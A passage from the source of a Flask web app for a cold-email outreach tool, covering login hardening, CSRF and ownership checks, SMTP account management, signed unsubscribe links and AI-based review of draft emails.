"""
app.py — Flask web application.
Run with:  python app.py
Then open: http://localhost:5000
"""

import csv
import io
import json

try:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment
    _OPENPYXL = True
except ImportError:
    _OPENPYXL = False
import base64
import hashlib
import hmac
import logging
import os
import secrets as _secrets
import sys
import threading
import time as _time
from collections import defaultdict, deque
from datetime import datetime, timedelta
from functools import wraps
from urllib.parse import urlparse
from flask import (
    Flask, render_template, request, jsonify,
    redirect, url_for, make_response, Response, session, abort
)

import db
import scheduler
import sender as email_sender

# The scraper deliberately does NOT run here. It needs a visible Chrome window
# for CAPTCHA solving, which a headless server cannot provide -- on the GCP VM
# it failed at browser launch because the deploy never runs
# `playwright install chromium` and there is no X display. The server now only
# queues jobs; a worker on the operator's machine claims and runs them.
# See scraper_worker.py.

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s"
)

app = Flask(__name__)

# How many proxies sit in front of this app and append to X-Forwarded-For.
# The GCP deploy runs behind a single Nginx, so 1 is right there. Set to 0 for
# direct exposure, which makes _client_ip ignore the header entirely.
TRUSTED_PROXY_COUNT = int(os.environ.get("TRUSTED_PROXY_COUNT", "1"))

# ── Startup ───────────────────────────────────────────────────────────────────

db.init_db()
db.seed_admin_from_env()
app.secret_key = os.environ.get("SECRET_KEY") or db.get_or_create_secret()

# Hardened session cookie settings. Set SHOUTREACH_INSECURE_COOKIES=1 for
# local-only HTTP development.
app.config.update(
    SESSION_COOKIE_SECURE      = os.environ.get("SHOUTREACH_INSECURE_COOKIES") != "1",
    SESSION_COOKIE_HTTPONLY    = True,
    SESSION_COOKIE_SAMESITE    = "Lax",
    PERMANENT_SESSION_LIFETIME = timedelta(days=14),
    MAX_CONTENT_LENGTH         = 16 * 1024 * 1024,  # 16 MB hard cap on uploads
)

# Start the background scheduler once, at process boot. Doing this in a
# before_request hook (the old way) added overhead per request and allowed
# duplicate threads under request races.
scheduler.start()


# ── First-run setup token ────────────────────────────────────────────────────
# If no users exist and ADMIN_PASS is not set, generate a one-time token that
# must be entered on the first-run web form. This stops random visitors from
# claiming the admin account on a fresh deploy.
_SETUP_TOKEN: str = ""
_SETUP_TOKEN_LOCK = threading.Lock()


def _ensure_setup_token() -> None:
    global _SETUP_TOKEN
    with _SETUP_TOKEN_LOCK:
        if db.user_count() == 0 and not os.environ.get("ADMIN_PASS") and not _SETUP_TOKEN:
            _SETUP_TOKEN = _secrets.token_urlsafe(24)
            banner = "=" * 64
            logging.warning(
                "\n%s\n SHOUTREACH FIRST-RUN SETUP TOKEN:\n   %s\n"
                " Enter this on the first-run setup form to create the admin.\n%s",
                banner, _SETUP_TOKEN, banner,
            )


def _consume_setup_token(submitted: str) -> bool:
    global _SETUP_TOKEN
    with _SETUP_TOKEN_LOCK:
        if not _SETUP_TOKEN:
            return False
        ok = hmac.compare_digest(submitted or "", _SETUP_TOKEN)
        if ok:
            _SETUP_TOKEN = ""
        return ok


_ensure_setup_token()


# ── Login rate limiter (per-IP, in-memory) ───────────────────────────────────
_LOGIN_WINDOW_SECS = 900   # 15 min
_LOGIN_MAX_ATTEMPTS = 10
_login_attempts: "defaultdict[str, deque]" = defaultdict(deque)
_login_attempts_lock = threading.Lock()


def _client_ip() -> str:
    """
    The caller's IP, for the login rate limiter.

    X-Forwarded-For is a client-supplied list that proxies append to, so its
    LEFTMOST entry is whatever the client claimed -- an attacker rotating that
    header got a fresh rate-limit bucket per request and walked straight past
    the throttle. Take the rightmost entries instead: those were written by
    proxies we actually control, counted by TRUSTED_PROXY_COUNT.
    """
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd and TRUSTED_PROXY_COUNT > 0:
        parts = [p.strip() for p in fwd.split(",") if p.strip()]
        if parts:
            # -1 is our own proxy's view of the peer; -2 if there are two, etc.
            index = max(0, len(parts) - TRUSTED_PROXY_COUNT)
            return parts[index]
    return request.remote_addr or "unknown"


def _login_rate_limited(ip: str) -> bool:
    now = _time.time()
    with _login_attempts_lock:
        dq = _login_attempts[ip]
        while dq and now - dq[0] > _LOGIN_WINDOW_SECS:
            dq.popleft()
        if len(dq) >= _LOGIN_MAX_ATTEMPTS:
            return True
        dq.append(now)
        return False


# ── Auth helpers ──────────────────────────────────────────────────────────────

_PUBLIC_PATHS = {"/login", "/logout"}
_CSRF_EXEMPT_PATHS = {"/login", "/logout"}

# Routes the local scrape worker calls. They authenticate with X-API-Key
# instead of a session cookie, so the login redirect and the CSRF token check
# -- both of which assume a browser -- have to step aside. Safe because a
# custom header cannot be attached cross-origin by a browser, which is the
# threat CSRF tokens exist to stop. Each of these still carries
# @worker_auth_required; skipping the hooks is not skipping authentication.
_WORKER_PATH_PREFIX = "/api/scraper/claim"
_WORKER_PATHS = {"/api/scraper/claim", "/api/scraper/heartbeat"}


def _has_valid_worker_key() -> bool:
    presented = request.headers.get("X-API-Key", "")
    if not presented:
        return False
    try:
        return hmac.compare_digest(presented, db.get_or_create_worker_api_key())
    except Exception:
        return False


def _is_worker_route() -> bool:
    path = request.path
    if path in _WORKER_PATHS:
        return True
    # /api/scraper/jobs/<id>/progress
    if path.startswith("/api/scraper/jobs/") and path.endswith("/progress"):
        return True
    # The worker pushes finished leads to the normal contacts import. That
    # route is also used by the browser, so it stays cookie+CSRF protected
    # unless a valid worker key is actually presented.
    return path == "/api/contacts/import" and _has_valid_worker_key()


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("user_id"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("is_admin"):
            return jsonify({"error": "Forbidden"}), 403
        return f(*args, **kwargs)
    return decorated


def admin_or_worker_required(f):
    """Either a logged-in admin in a browser, or the local scrape worker."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("is_admin") or _has_valid_worker_key():
            return f(*args, **kwargs)
        return jsonify({"error": "Forbidden"}), 403
    return decorated


def worker_auth_required(f):
    """
    Authenticate the local scrape worker by shared key instead of a session.

    The worker is a script, not a browser: it has no cookie and no CSRF token.
    A custom header is the right primitive here because browsers will not
    attach one cross-origin, so these routes are not CSRF-reachable the way a
    cookie-authenticated route is. Compared with compare_digest so a wrong key
    cannot be recovered by timing the response.
    """
    @wraps(f)
    def decorated(*args, **kwargs):
        presented = request.headers.get("X-API-Key", "")
        expected = db.get_or_create_worker_api_key()
        if not presented or not hmac.compare_digest(presented, expected):
            return jsonify({"error": "Invalid or missing worker API key"}), 401
        return f(*args, **kwargs)
    return decorated


# ── Who is acting ─────────────────────────────────────────────────────────────
#
# Operators share this install's sending accounts, domain and daily cap, but
# not their leads. Every read and write below is scoped to one of them.

def me() -> int:
    """The logged-in operator. Every data route scopes to this."""
    return session["user_id"]


def require_owned(kind: str, row_id):
    """
    Refuse a row that belongs to somebody else.

    404, not 403: a 403 would confirm the row exists, which is already more
    than one operator should learn about another's list by guessing ids.
    """
    if not db.owns(kind, row_id, me()):
        abort(404)


def owned(kind: str, param: str):
    """
    Route decorator form of require_owned, for the routes that act on a single
    record named in the URL. Spelled out per route rather than inferred from
    the path so that adding a route does not silently inherit -- or silently
    miss -- an ownership check.
    """
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            require_owned(kind, kwargs[param])
            return f(*args, **kwargs)
        return decorated
    return decorator


def import_owner(rows) -> int:
    """
    Who incoming import rows belong to.

    A browser import belongs to whoever is logged in. The scrape worker has no
    session -- it authenticates with a shared key -- so its rows are attributed
    through the job that produced them, which recorded its owner when it was
    queued. The worker tags rows with source_job_id but treats that tag as
    optional, so the job it is currently running is the fallback. If neither
    says, the import is refused rather than filed under a guess.
    """
    if session.get("user_id"):
        return session["user_id"]
    for jid in {r.get("source_job_id") for r in rows if r.get("source_job_id")}:
        job = db.get_scrape_job(jid)
        if job and job.get("owner_id"):
            return job["owner_id"]
    active = db.get_active_scrape_job(any_owner=True)
    if active and active.get("owner_id"):
        return active["owner_id"]
    abort(400, "Cannot tell which account these leads belong to")


def _ensure_csrf_token() -> str:
    if not session.get("csrf_token"):
        session["csrf_token"] = _secrets.token_urlsafe(32)
    return session["csrf_token"]


def _same_origin() -> bool:
    """Best-effort origin check: Origin or Referer must match this host."""
    host = request.host
    origin = request.headers.get("Origin")
    if origin:
        try:
            return urlparse(origin).netloc == host
        except Exception:
            return False
    referer = request.headers.get("Referer")
    if referer:
        try:
            return urlparse(referer).netloc == host
        except Exception:
            return False
    # No Origin and no Referer is suspicious for a state-changing request, but
    # some browsers (and curl) omit both. Allow it; CSRF token on the JSON
    # endpoints provides the real defence.
    return True


@app.before_request
def _require_login():
    if request.path in _PUBLIC_PATHS or request.path.startswith("/unsubscribe"):
        return
    if _is_worker_route():
        return          # authenticated by X-API-Key in worker_auth_required
    if not session.get("user_id"):
        if request.path.startswith("/api/"):
            return jsonify({"error": "Unauthorized"}), 401
        return redirect("/login")


@app.before_request
def _check_csrf():
    if request.method in ("GET", "HEAD", "OPTIONS"):
        return
    if request.path in _CSRF_EXEMPT_PATHS:
        return
    if request.path.startswith("/unsubscribe"):
        return
    if _is_worker_route():
        return          # header auth, not cookie auth -- see _WORKER_PATHS
    # _require_login already redirected unauthed users; here we know there is
    # a session. Compare submitted token against the one bound to this session.
    submitted = request.headers.get("X-CSRF-Token") or request.form.get("csrf_token") or ""
    expected = session.get("csrf_token") or ""
    if not submitted or not expected or not hmac.compare_digest(submitted, expected):
        return jsonify({"error": "Invalid or missing CSRF token"}), 403


@app.after_request
def _security_headers(resp):
    resp.headers.setdefault("X-Frame-Options", "DENY")
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    resp.headers.setdefault(
        "Permissions-Policy", "geolocation=(), microphone=(), camera=(), interest-cohort=()"
    )
    if request.is_secure or request.headers.get("X-Forwarded-Proto") == "https":
        resp.headers.setdefault(
            "Strict-Transport-Security", "max-age=31536000; includeSubDomains"
        )
    return resp


@app.route("/api/csrf", methods=["GET"])
def api_csrf():
    return jsonify({"csrf_token": _ensure_csrf_token()})


# ── Login / Logout ────────────────────────────────────────────────────────────

@app.route("/login", methods=["GET"])
def login_page():
    if session.get("user_id"):
        return redirect("/")
    _ensure_setup_token()
    first_run = db.user_count() == 0
    error = request.args.get("error", "")
    # Bind a CSRF token to the unauthenticated session so the form can submit it.
    csrf_token = _ensure_csrf_token()
    return render_template(
        "login.html",
        error=error,
        first_run=first_run,
        csrf_token=csrf_token,
    )


@app.route("/login", methods=["POST"])
def login_submit():
    # Same-origin check stops cross-site form POSTs.
    if not _same_origin():
        return render_template(
            "login.html", first_run=db.user_count() == 0,
            csrf_token=_ensure_csrf_token(),
            error="Request origin mismatch.",
        ), 403

    # CSRF token check (the global _check_csrf hook exempts /login because the
    # session is empty before login; we enforce it manually here using whatever
    # token was bound to the visitor's pre-login session).
    submitted_csrf = request.form.get("csrf_token", "")
    expected_csrf  = session.get("csrf_token", "")
    if not submitted_csrf or not expected_csrf or not hmac.compare_digest(submitted_csrf, expected_csrf):
        return render_template(
            "login.html", first_run=db.user_count() == 0,
            csrf_token=_ensure_csrf_token(),
            error="Session expired — please try again.",
        ), 403

    # Per-IP brute-force throttle.
    ip = _client_ip()
    if _login_rate_limited(ip):
        return render_template(
            "login.html", first_run=db.user_count() == 0,
            csrf_token=_ensure_csrf_token(),
            error="Too many attempts. Try again in 15 minutes.",
        ), 429

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    if db.user_count() == 0:
        # First-run: must present the setup token (logged at boot) to claim admin.
        _ensure_setup_token()
        if not _consume_setup_token(request.form.get("setup_token", "").strip()):
            return render_template(
                "login.html", first_run=True,
                csrf_token=_ensure_csrf_token(),
                error="Invalid setup token. Check the server startup logs.",
            ), 403
        if not username or len(password) < 12:
            # Re-arm the token so a typo on first-run doesn't lock the operator out.
            global _SETUP_TOKEN
            with _SETUP_TOKEN_LOCK:
                _SETUP_TOKEN = _secrets.token_urlsafe(24)
                logging.warning("Setup token consumed but admin not created; new token: %s", _SETUP_TOKEN)
            return render_template(
                "login.html", first_run=True,
                csrf_token=_ensure_csrf_token(),
                error="Username required and password must be at least 12 characters. A new setup token has been issued (see server logs).",
            ), 400
        db.create_user(username, password, is_admin=True)
        user = db.authenticate(username, password)
        logging.info("First-run admin '%s' created from setup token (ip=%s)", username, ip)
    else:
        user = db.authenticate(username, password)
        if not user:
            logging.info("Failed login attempt for username=%r ip=%s", username, ip)
            return render_template(
                "login.html", first_run=False,
                csrf_token=_ensure_csrf_token(),
                error="Invalid username or password.",
            ), 401

    # Successful login — rotate the session and bind a fresh CSRF token.
    session.clear()
    session.permanent = True
    session["user_id"]    = user["id"]
    session["username"]   = user["username"]
    session["is_admin"]   = bool(user["is_admin"])
    session["csrf_token"] = _secrets.token_urlsafe(32)
    return redirect("/")


@app.route("/logout", methods=["GET", "POST"])
def logout():
    session.clear()
    return redirect("/login")


# ── Pages ─────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


def _verify_unsub_token(token: str):
    """Verify the HMAC-signed unsubscribe token. Returns the email or None."""
    try:
        parts = token.rsplit(".", 1)
        if len(parts) != 2:
            return None
        encoded, sig = parts
        rem = len(encoded) % 4
        if rem:
            encoded += "=" * (4 - rem)
        email_addr = base64.urlsafe_b64decode(encoded.encode()).decode()
        secret = db.get_or_create_secret()
        expected = hmac.new(
            secret.encode(), email_addr.lower().encode(), hashlib.sha256
        ).hexdigest()[:20]
        if hmac.compare_digest(sig, expected):
            return email_addr
        return None
    except Exception:
        return None


# RFC 8058: sender.py advertises List-Unsubscribe-Post, which tells Gmail and
# Yahoo to POST here when the user clicks their native Unsubscribe button.
# GET-only meant that POST got a 405, so the button silently failed while we
# claimed to support it -- exactly what the 2024 bulk-sender rules penalise.
@app.route("/unsubscribe/<token>", methods=["GET", "POST"])
def unsubscribe(token):
    email_addr = _verify_unsub_token(token)
    if not email_addr:
        return make_response("<p>Invalid or expired unsubscribe link.</p>", 400)
    db.unsubscribe_contact(email_addr)
    db.add_log(f"Unsubscribed: {email_addr}")
    return make_response(
        "<html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
        "<h2>✓ You've been unsubscribed</h2>"
        "<p>You won't receive any more emails from this sender.</p>"
        "</body></html>",
        200,
    )


# ── API: Settings ─────────────────────────────────────────────────────────────

# Explicit denylist of setting keys whose values must never leave the server.
# Anything sensitive (credentials, API keys, signing secrets) belongs here.
_SECRET_SETTING_KEYS = {
    "smtp_pass", "imap_pass",
    "anthropic_api_key", "gemini_api_key", "openai_api_key",
    "_secret_key",
}
_SECRET_PLACEHOLDER = "●●●●●●"


def _is_secret_key(key: str) -> bool:
    if key in _SECRET_SETTING_KEYS:
        return True
    # Defensive default: anything that looks like a secret gets masked too.
    lower = key.lower()
    return (
        "pass" in lower
        or lower.endswith("_key")
        or lower.endswith("_secret")
        or lower.endswith("_token")
    )


@app.route("/api/settings", methods=["GET"])
@login_required
def api_get_settings():
    s = db.get_settings()
    safe = {k: (_SECRET_PLACEHOLDER if _is_secret_key(k) else v) for k, v in s.items()}
    return jsonify(safe)


@app.route("/api/settings", methods=["POST"])
@admin_required
def api_save_settings():
    data = request.json or {}
    existing = db.get_settings()
    filtered = {}
    for k, v in data.items():
        if _is_secret_key(k) and v == _SECRET_PLACEHOLDER:
            filtered[k] = existing.get(k, "")
        else:
            filtered[k] = v
    db.save_settings(filtered)
    return jsonify({"ok": True})


@app.route("/api/settings/worker-key", methods=["GET"])
@admin_required
def api_get_worker_key():
    """Deliberately separate from /api/settings, which masks every secret."""
    return jsonify({"key": db.get_or_create_worker_api_key()})


@app.route("/api/settings/worker-key", methods=["POST"])
@admin_required
def api_rotate_worker_key():
    return jsonify({"key": db.rotate_worker_api_key()})


@app.route("/api/settings/test-smtp", methods=["POST"])
@admin_required
def api_test_smtp():
    settings = db.get_settings()
    ok, msg = email_sender.test_smtp(settings)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/settings/test-imap", methods=["POST"])
@admin_required
def api_test_imap():
    settings = db.get_settings()
    ok, msg = email_sender.test_imap(settings)
    return jsonify({"ok": ok, "message": msg})


# ── API: SMTP Accounts ───────────────────────────────────────────────────────

@app.route("/api/accounts", methods=["GET"])
@admin_required
def api_get_accounts():
    accounts = db.get_smtp_accounts()
    # Mask passwords before sending to frontend
    for a in accounts:
        a["smtp_pass"] = _SECRET_PLACEHOLDER if a.get("smtp_pass") else ""
        a["imap_pass"] = _SECRET_PLACEHOLDER if a.get("imap_pass") else ""
    return jsonify(accounts)


@app.route("/api/accounts", methods=["POST"])
@admin_required
def api_create_account():
    d = request.json or {}
    aid = db.create_smtp_account(d)
    return jsonify({"ok": True, "id": aid})


@app.route("/api/accounts/<int:aid>", methods=["PUT"])
@admin_required
def api_update_account(aid):
    d = request.json or {}
    existing = db.get_smtp_account(aid)
    if not existing:
        return jsonify({"ok": False, "error": "Not found"}), 404
    # Keep the stored password unless a real new one was typed. Blank counts as
    # "unchanged", not "clear it": the edit form leaves the field empty rather
    # than prefilling the mask, so saving an unrelated change would otherwise
    # wipe the credentials and break sending with no obvious cause. The mask is
    # still accepted for older clients that echo it back.
    for key in ("smtp_pass", "imap_pass"):
        if d.get(key) in (None, "", _SECRET_PLACEHOLDER):
            d[key] = existing.get(key, "")
    db.update_smtp_account(aid, d)
    return jsonify({"ok": True})


@app.route("/api/accounts/<int:aid>", methods=["DELETE"])
@admin_required
def api_delete_account(aid):
    db.delete_smtp_account(aid)
    return jsonify({"ok": True})


def _port_or(default, raw):
    try:
        return int(raw)
    except (TypeError, ValueError):
        return default


def _unmask_pass(submitted, account_id, field):
    """
    Resolve a password coming from the account form.

    An untouched field still holds the mask the GET route substituted, so fall
    back to what is stored rather than trying to authenticate with six bullet
    characters.
    """
    if submitted and submitted != _SECRET_PLACEHOLDER:
        return submitted
    if account_id:
        existing = db.get_smtp_account(account_id) or {}
        return existing.get(field, "")
    return submitted or ""


@app.route("/api/accounts/test-smtp", methods=["POST"])
@admin_required
def api_test_smtp_config():
    """
    Test the credentials currently in the form, not the ones in the database.

    The by-id routes below read the saved account, so pasting a new password
    and pressing Test reported a failure for the OLD password -- the new one
    never left the browser. That made a correct credential look rejected, and
    it also meant a brand-new account could not be tested before saving.
    """
    d   = request.json or {}
    aid = d.get("id")
    aid = int(aid) if aid else None

    cfg = {
        "smtp_host": (d.get("smtp_host") or "").strip(),
        "smtp_port": _port_or(587, d.get("smtp_port")),
        "smtp_user": (d.get("smtp_user") or "").strip(),
        "smtp_pass": _unmask_pass(d.get("smtp_pass"), aid, "smtp_pass"),
    }
    if not cfg["smtp_host"]:
        return jsonify({"ok": False, "message": "SMTP host is required"}), 400
    if not cfg["smtp_pass"]:
        return jsonify({"ok": False, "message": "SMTP password is required"}), 400

    ok, msg = email_sender.test_smtp(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/accounts/test-imap", methods=["POST"])
@admin_required
def api_test_imap_config():
    """IMAP counterpart of api_test_smtp_config — tests the form, not the DB."""
    d   = request.json or {}
    aid = d.get("id")
    aid = int(aid) if aid else None

    cfg = {
        "imap_host": (d.get("imap_host") or "").strip(),
        "imap_user": (d.get("imap_user") or "").strip(),
        "imap_pass": _unmask_pass(d.get("imap_pass"), aid, "imap_pass"),
    }
    if not cfg["imap_host"]:
        return jsonify({"ok": False, "message": "IMAP host is required"}), 400
    if not cfg["imap_pass"]:
        return jsonify({"ok": False, "message": "IMAP password is required"}), 400

    ok, msg = email_sender.test_imap(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/accounts/<int:aid>/test-smtp", methods=["POST"])
@admin_required
def api_test_account_smtp(aid):
    acct = db.get_smtp_account(aid)
    if not acct:
        return jsonify({"ok": False, "message": "Account not found"}), 404
    cfg = {
        "smtp_host": acct["smtp_host"], "smtp_port": acct["smtp_port"],
        "smtp_user": acct["smtp_user"], "smtp_pass": acct["smtp_pass"],
    }
    ok, msg = email_sender.test_smtp(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/accounts/<int:aid>/test-imap", methods=["POST"])
@admin_required
def api_test_account_imap(aid):
    acct = db.get_smtp_account(aid)
    if not acct:
        return jsonify({"ok": False, "message": "Account not found"}), 404
    cfg = {
        "imap_host": acct["imap_host"],
        "imap_user": acct["imap_user"],
        "imap_pass": acct["imap_pass"],
    }
    ok, msg = email_sender.test_imap(cfg)
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/campaigns/<int:cid>/accounts", methods=["GET"])
@login_required
@owned("campaign", "cid")
def api_get_campaign_accounts(cid):
    return jsonify(db.get_campaign_smtp_accounts(cid))


@app.route("/api/campaigns/<int:cid>/accounts", methods=["POST"])
@login_required
@owned("campaign", "cid")
def api_set_campaign_accounts(cid):
    ids = (request.json or {}).get("account_ids", [])
    db.set_campaign_smtp_accounts(cid, ids)
    return jsonify({"ok": True})


# ── API: Users ────────────────────────────────────────────────────────────────

@app.route("/api/users", methods=["GET"])
@admin_required
def api_list_users():
    return jsonify(db.list_users())


@app.route("/api/users", methods=["POST"])
@admin_required
def api_create_user():
    d = request.json or {}
    username = d.get("username", "").strip()
    password = d.get("password", "")
    is_admin = bool(d.get("is_admin", False))
    if not username or not password:
        return jsonify({"error": "Username and password required"}), 400
    # Same floor as changing one anywhere else. It used to be 8 here and 12
    # everywhere else, so the weakest password on the system was always the one
    # an account was created with.
    if len(password) < 12:
        return jsonify({"error": "Password must be at least 12 characters"}), 400
    if db.get_user_by_username(username):
        return jsonify({"error": "Username already exists"}), 409
    uid = db.create_user(username, password, is_admin)
    return jsonify({"ok": True, "id": uid})


@app.route("/api/users/<int:uid>", methods=["DELETE"])
@admin_required
def api_delete_user(uid):
    if uid == session["user_id"]:
        return jsonify({"error": "Cannot delete your own account"}), 400
    ok, err = db.delete_user(uid)
    if not ok:
        return jsonify({"error": err}), 409
    return jsonify({"ok": True})


@app.route("/api/users/<int:uid>/password", methods=["POST"])
def api_change_password(uid):
    # Admins can change anyone's password; users can only change their own.
    is_self  = uid == session.get("user_id")
    is_admin = bool(session.get("is_admin"))
    if not is_admin and not is_self:
        return jsonify({"error": "Forbidden"}), 403

    d = request.json or {}
    new_pass     = d.get("password", "")
    current_pass = d.get("current_password", "")

    if len(new_pass) < 12:
        return jsonify({"error": "Password must be at least 12 characters"}), 400

    # Self-service password change requires the current password — this stops
    # an XSS or session-fixation attacker from silently rotating credentials.
    # Admins changing OTHER users' passwords don't need the target's password
    # (this is the intended admin reset flow); admins changing their OWN
    # password still need to prove they know the current one.
    if is_self:
        user = db.get_user_by_id(uid)
        if not user or not db.verify_user_password(user, current_pass):
            return jsonify({"error": "Current password is incorrect"}), 403

    db.change_password(uid, new_pass)
    logging.info("Password changed for uid=%s by uid=%s", uid, session.get("user_id"))
    return jsonify({"ok": True})


@app.route("/api/users/me", methods=["GET"])
def api_me():
    return jsonify({
        "id":       session.get("user_id"),
        "username": session.get("username"),
        "is_admin": session.get("is_admin"),
    })


# ── API: Contacts — Unsubscribed ─────────────────────────────────────────────

@app.route("/api/contacts/unsubscribed", methods=["GET"])
def api_unsubscribed():
    return jsonify(db.get_unsubscribed_contacts(owner_id=me()))


@app.route("/api/contacts/invalid-mx", methods=["GET"])
def api_invalid_mx():
    return jsonify(db.get_invalid_mx_contacts(owner_id=me()))


# ── API: Preview ─────────────────────────────────────────────────────────────

@app.route("/api/preview", methods=["POST"])
def api_preview():
    d = request.json or {}
    subject_tpl = d.get("subject", "")
    body_tpl    = d.get("body_html", "")
    contact     = d.get("contact", {})
    subject  = email_sender._render(subject_tpl, contact)
    body_html = email_sender._plain_to_html(email_sender._render(body_tpl, contact))
    return jsonify({"subject": subject, "body_html": body_html})


# ── API: AI Review ────────────────────────────────────────────────────────────

_REVIEW_PROMPT = """You are an expert cold-email copywriter. Review this outreach email and respond with ONLY valid JSON (no markdown, no extra text).

Subject: {subject}

Body:
{body}

Respond with this exact JSON structure:
{{
  "score": <integer 1-10>,
  "summary": "<one sentence overall verdict>",
  "strengths": ["<strength 1>", "<strength 2>"],
  "issues": ["<issue 1>", "<issue 2>"],
  "suggestions": ["<suggestion 1>", "<suggestion 2>"],
  "deliverability_risk": "<low|medium|high>",
  "rewrite": {{
    "subject": "<improved subject line, preserving any {{{{variable}}}} placeholders>",
    "body": "<improved full body, preserving any {{{{variable}}}} placeholders>"
  }}
}}"""


_CLAUDE_DEFAULT  = "claude-haiku-4-5-20251001"
_GEMINI_DEFAULT  = "gemini-1.5-flash"
_OPENAI_DEFAULT  = "gpt-4o-mini"


def _ai_http_post(url: str, payload: bytes, headers: dict) -> dict:
    """POST to an AI provider and return parsed JSON.
    Raises ValueError with a user-friendly message on any failure."""
    import urllib.request
    import urllib.error
    req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        status = exc.code
        try:
            body = json.loads(exc.read())
            msg = (
                (body.get("error") or {}).get("message")
                or body.get("message")
                or ""
            )
        except Exception:
            msg = ""
        if status == 401:
            raise ValueError("Invalid API key — check your key in Settings") from exc
        if status == 403:
            raise ValueError(msg or "Access denied — your key may lack permissions") from exc
        if status == 404:
            raise ValueError("Model not found — the selected model ID may be incorrect or not yet available") from exc
        if status == 429:
            raise ValueError(msg or "Rate limit hit or credits exhausted — check your account balance") from exc
        if status >= 500:
            raise ValueError(f"Provider server error (HTTP {status}) — try again in a moment") from exc
        raise ValueError(msg or f"API error (HTTP {status})") from exc
    except urllib.error.URLError as exc:
        reason = str(exc.reason)
        if "timed out" in reason.lower():
            raise ValueError("Request timed out — the provider took too long to respond") from exc
        raise ValueError(f"Network error — could not reach provider ({reason})") from exc


def _strip_code_fence(text: str) -> str:
    if text.startswith("```"):
        text = text.split("```")[1]
        if text.startswith("json"):
            text = text[4:]
    return text.strip()


def _parse_ai_json(text: str) -> dict:
    text = _strip_code_fence(text.strip())
    try:
        return json.loads(text)
    except json.JSONDecodeError as exc:
        raise ValueError(f"AI returned a non-JSON response — try again or switch models") from exc


def _call_claude_review(api_key: str, subject: str, body: str, model: str) -> dict:
    prompt = _REVIEW_PROMPT.format(subject=subject, body=body)
    payload = json.dumps({
        "model": model or _CLAUDE_DEFAULT,
        "max_tokens": 1024,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    data = _ai_http_post(
        "https://api.anthropic.com/v1/messages",
        payload,
        {"x-api-key": api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"},
    )
    return _parse_ai_json(data["content"][0]["text"])


def _call_gemini_review(api_key: str, subject: str, body: str, model: str) -> dict:
    prompt = _REVIEW_PROMPT.format(subject=subject, body=body)
    model = model or _GEMINI_DEFAULT
    payload = json.dumps({
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.2},
    }).encode()
    data = _ai_http_post(
        f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={api_key}",
        payload,
        {"content-type": "application/json"},
    )
    text = data["candidates"][0]["content"]["parts"][0]["text"]
    return _parse_ai_json(text)


def _call_openai_review(api_key: str, subject: str, body: str, model: str) -> dict:
    prompt = _REVIEW_PROMPT.format(subject=subject, body=body)
    payload = json.dumps({
        "model": model or _OPENAI_DEFAULT,
        "max_completion_tokens": 1024,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    data = _ai_http_post(
        "https://api.openai.com/v1/chat/completions",
        payload,
        {"Authorization": f"Bearer {api_key}", "content-type": "application/json"},
    )
    text = data["choices"][0]["message"]["content"]
    return _parse_ai_json(text)


_AI_CALLERS = {
    "claude":  (_call_claude_review,  "anthropic_api_key"),
    "gemini":  (_call_gemini_review,  "gemini_api_key"),
    "openai":  (_call_openai_review,  "openai_api_key"),
}


@app.route("/api/ai/review", methods=["POST"])
@login_required
def api_ai_review():
    s = db.get_settings()
    if s.get("ai_features_enabled") != "1":
        return jsonify({"error": "AI features are not enabled"}), 403

    provider = s.get("ai_provider", "claude")
    if provider not in _AI_CALLERS:
        provider = "claude"
    caller_fn, key_setting = _AI_CALLERS[provider]
    api_key = s.get(key_setting, "").strip()
    if not api_key:
        return jsonify({"error": f"API key for {provider} is not configured"}), 403
    model = s.get("ai_model", "").strip()

    d = request.json or {}
    subject = d.get("subject", "").strip()
    body    = d.get("body", "").strip()
    if not subject and not body:
        return jsonify({"error": "Subject and body are empty"}), 400

    try:
        result = caller_fn(api_key, subject, body, model)
        return jsonify(result)
    except ValueError as exc:
        # Known, user-facing errors (bad key, model not found, credits, timeout, bad JSON)
        logging.warning("AI review error: %s", exc)
        return jsonify({"error": str(exc)}), 400
    except Exception as exc:
        # Unexpected crash — log the full traceback but return a generic message
        logging.exception("Unexpected AI review error")
        return jsonify({"error": "Unexpected error — check server logs for details"}), 500


# ── AI: plain-text completion (WhatsApp paraphrase) ──────────────────────────
#
# Separate from the review callers above: those are locked to the review
# prompt and a fixed JSON reply shape. This is the same three providers and
# the same _ai_http_post transport, but for "here's a prompt, give me text
# back" -- used once, in a batch, to paraphrase a page of templated WhatsApp
# openers for variety. Never called per-lead; see api_wa_draft_batch.

def _call_claude_text(api_key: str, prompt: str, model: str) -> str:
    payload = json.dumps({
        "model": model or _CLAUDE_DEFAULT,
        "max_tokens": 2048,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    data = _ai_http_post(
        "https://api.anthropic.com/v1/messages", payload,
        {"x-api-key": api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"},
    )
    return data["content"][0]["text"]

